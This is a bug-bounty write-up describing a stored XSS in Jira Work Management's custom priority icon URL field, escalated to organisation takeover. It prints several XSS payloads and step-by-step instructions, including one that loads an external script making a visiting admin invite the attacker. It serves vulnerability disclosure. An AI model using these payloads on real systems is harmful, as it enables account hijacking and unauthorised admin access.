# Summary

We found various XSS(cross site scripting) bugs on jira  here is an account of a *stored xss* in jira work managemnet. This stored XSS lead to *Org takeover*.  You will be reading about the prominent bug and how it lead us to overtake the **Jira organization**.

Jira is a widely used software to manage and collaborate on various tasks. Jira will help you to manage all kinds of use cases of your product. It can help you to track the issues, bugs for your products. Jira eventually evolved in a work management tool for organizations. For tracking issues in _jira work managemnet_, we found a simple yet useful feature which were called as **Priority levels**. Priority conveyed *severity levels* of the issues/bugs for the organization. 

{{Picture of priority levels}}

We found a user who had a permission on a particular *project* in work management can *create customised priority levels*. Which in other words gave us the *control to input and store data fields* as *priority levels*.  It was there, we stored our inputs, after digging and anayzing the *stored inputs* we found an optimal location in the *url field* to store our **XSS payload**. The xss payload was being stored in the url field, of the customized priority. The payload in url field was quite simple  `https://www.google.com?name=<script>alrert('snapsec')</alert)`. After we got the *pop up* we escalated it to the **organization takeover**. Organization takeover means *inviting attacker* in all other *jira products* of the **organization as an admin**. 

## What is stored XSS?

Stored XSS is that type of XSS vulnerability which will allow the attacker to store *malicious code(javascrip code)* on the server. These instances are common when an *application* let's its users to store user input. The examples of such instances can be *message boards, name fields* and particular;y in this case it was the **priority levels**.


#  Impact

In the context of web application the Stored XSS has an Known impact, Stored XSS (also known as second-order XSS) is the most dangerous type of cross-site scripting attack. The reason is that it does not require users to click a malicious link or perform any activity, other than browsing to a legitimate web page. Once an attacker discovers a stored XSS vulnerability and stores the XSS code into the context of the the target web application, all visitors to affected pages can be compromised by either stealing their session cookies/Tokens or making several changes(email-change etc) to their account leading to full account takeover impact.

The challenge for us was demonstrating the proper impact of the vulnerability. Because this was an authenticated XSS, we went straight to Jira User management and spent some time understanding user roles and their and levels of access within the application.The goal was to find the lowest-level role possible that could create the Custom Priority with an XSS payload and then deliver the attack to Admin/Super admins within the organisation.

And we landed on  `Product admin permission`  , attacker had no permission to access any of the jira products like Confluence, Service management which means he don't have access to any Jira applications but can perform administration tasks which includes Editing Issues Periorties. We crafted our js code in such a way that it added the attacker in all other *jira products* as an admin, and hence we as an attacker *overtook* the jira organization.

{{picture from of permission model}}


# Description

As hinted earlier *jira work management* let's its users to create *customised priorities* for the *projects*. The **priority level** conveys the severity of an issue so that agents can react accordingly, it identifies the relative importance of an incident and is usually based on the impact and urgency of an issue.

So, once an attacker was given access to one project in the *jira work management* , he can *create his customised* priority levels. We created one *customised priority level*.  We tried various basic XSS payloads on the given input fields and found they were *encoded properly*. But below there was *an icon* url for the *priority* and we just *posted a random domain* with the *protocol https*. We found that no characters were *encoded* or *stripped* from the url. Then it was a basic *instinct to* add a *parameter* to this *url* and in the value of the parameter, we *injected our XSS payload*.  It looked something like this `https://www.google.com?name-<script>alert(0)</script>`. 

It was found that was no *encoding or other defenses* for this *input field* and we directly after saving the *priority* we got a *Pop up*.

{{Pop up picture}}

After that we escalated this *stored xss* to an *organization takeover*. Attacker who only had permissions in one *project of workamangement* could *now be an admin* of the *whole jira ccount*. This was accomplished by *understanding the roles and permissions* of the *jira organization* finely. We spent time understanding the *permission model* and later used those *permissions*  to escalate the *role of attacker* to *organization admin* of the all products of jira. You can read this in more detail in the **Technical Analysis section**.


====================================================================================================================================================================

# Technical analysis
Jira Work Management is a widely used collaboration tool designed to help teams track all activity considered work. Work might include running projects, managing approval processes, performing daily and periodic tasks, creating documents, and a lot more.

Our team recently found an Stored XSS issue in Jira Work management which allowed them to demonistrate an Full Orginisation Takeover impact within Jira Work Management Software of Atlassian.

## Technical Analysis

Jira work management is one of the products that lie within Atlaissian Eco-system and is accessable through the url `bugbounty-test-<bugcrowd-name>.atlassian.net/jira/your-work`


![image](https://user-images.githubusercontent.com/88488902/196861542-5a40d52e-c7d6-42e4-bc19-ea9b2df7b71d.png)

Different organizations use Jira work Management to track different kinds of issues, which can represent anything from a software bug, to a project task, or a leave request form.

![image](https://user-images.githubusercontent.com/88488902/196862718-107760da-0dbd-4fe6-90a5-59cae71ab8de.png)


users can create issues and track them, Issues in Jira are made up of fields that store various pieces of information. Every issue comes with default system fields, like name or description, Periority etc, An issue's priority indicates its relative importance within the target Orginisation.

Jira Work Management provide  default priorities values like(Highest, High, Medium, Low, Lowest) But Both the priorities and their meanings can be customized by your administrator to suit your organization. 


We Noticed An user with proper permissions can create a new Custom Periority with icon URL Property set to `https://google.com?name=</script><script>alert(0)</script>` 

![image](https://user-images.githubusercontent.com/88488902/196863642-d9afd97e-14ad-4001-acdd-0cd8906d55a4.png)


On Saving the Periority, it seems there was no Validation(Encoding) or `Icon Url` property happening at the backend, hence triggered an XSS at the Frontend.

![image](https://user-images.githubusercontent.com/88488902/196864070-f2f97700-bed7-41a4-a30d-ae234d961b48.png)




## Impact

In the context of web application the Stored XSS has an Known impact, Stored XSS (also known as second-order XSS) is the most dangerous type of cross-site scripting attack. The reason is that it does not require users to click a malicious link or perform any activity, other than browsing to a legitimate web page. Once an attacker discovers a stored XSS vulnerability and stores the XSS code into the context of the the target web application, all visitors to affected pages can be compromised by either stealing their session cookies/Tokens or making several changes(email-change etc) to their account leading to full account takeover impact.

The real challenge for us was demonstrating the proper impact of the vulnerability. Because this was an authenticated XSS, we went straight to Jira User management and spent some time understanding user roles and their and levels of access within the application.

The goal was to find the lowest-level role possible that could create the Custom Priority with an XSS payload and then deliver the attack to Admin/Super admins within the organisation.

and we landed on `Product admin permission` , He had no permission to access any of the jira products like Confluence, Service management which means he don't have access to any Jira applications but can perform administration tasks which includes Editing Issues Periorties.

![image](https://user-images.githubusercontent.com/88488902/196865675-619bd57f-ba4a-4b65-81ab-deddd7a2461c.png)

and we landed on `Product admin permission` , He had no permission to access any of the jira products like Confluence, Service management which means he don't have access to any Jira applications but can perform administration tasks which includes Editing Issues Periorties.


## In org takeover

Now let's assume we have invited an User with Product admin permission > he has no permission to access any of the jira products like Confluence, Service management which means he don't have access to any Jira applications but can perform administration tasks which includes Editing Issues Periorties.

- Login with an User with Product admin permission , Click on Setting Icon and then Click on Issues

![image](https://user-images.githubusercontent.com/88488902/196865675-619bd57f-ba4a-4b65-81ab-deddd7a2461c.png)


- Now Scroll down and Add a new Priorities with the following icon url, and click ADD button `https://google.com?name=</script><script src=https://snapsec.co/jira-xss.js></script>`


![image](https://user-images.githubusercontent.com/88488902/196865804-378e702f-3d10-4220-b8b4-3b9de3bab597.png)



- Now as soon as Admin Visits the same page from his browser, An invite request will be sent from his browser .

![image](https://user-images.githubusercontent.com/88488902/196865837-2ef2a8e5-a04a-4285-ac34-acb116e64bf4.png)

- and to confirm you can go to user management and see attacker forced admin to invited a new user with access to 3 products, Hence would allow him to view/create/delete/modify projects in those products


![image](https://user-images.githubusercontent.com/88488902/196865866-8a6f5e62-9aeb-4dbd-b77e-9f0f87f701d5.png)






